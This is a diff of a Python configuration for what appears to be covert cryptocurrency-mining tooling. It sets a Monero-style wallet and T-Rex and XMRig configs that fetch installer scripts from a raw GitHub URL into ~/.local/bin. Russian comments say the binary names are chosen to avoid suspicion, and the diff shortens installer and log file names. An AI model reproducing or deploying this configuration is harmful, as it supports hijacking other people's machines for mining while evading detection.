@@ -13,20 +13,20 @@ OCEAN_WALLET = "885VUf2YL1WDTQZm36tSZU7NqZaSFNSvWH96431L1y5K3cde8sUEQZEQpbxS8JKW
 
 TREX_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/trex.sh", # Замени
-    "INSTALLER_NAME": "install_trex.sh",
+    "INSTALLER_NAME": "install_t.sh",
     "BINARY_NAME": "TREX_BIN", # Новое имя, чтобы не было подозрений
     "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
-    "LOG_FILE": "t_rex.log",
+    "LOG_FILE": "t.log",
     "API_PORT": 60000,
     "API_TYPE": "trex"
 }
 
 XMRIG_CONFIG = {
     "SCRIPT_URL": "https://raw.githubusercontent.com/comfylover/patch/refs/heads/master/ocean.sh", # Замени
-    "INSTALLER_NAME": "install_xmrig.sh",
+    "INSTALLER_NAME": "install_x.sh",
     "BINARY_NAME": "XMRIG_BIN", # Новое имя
     "INSTALL_DIR": os.path.expanduser("~/.local/bin"), # Папка для бинарника
-    "LOG_FILE": "xmrig.log",
+    "LOG_FILE": "x.log",
     "API_PORT": 60001,
     "API_TYPE": "xmrig"
 }
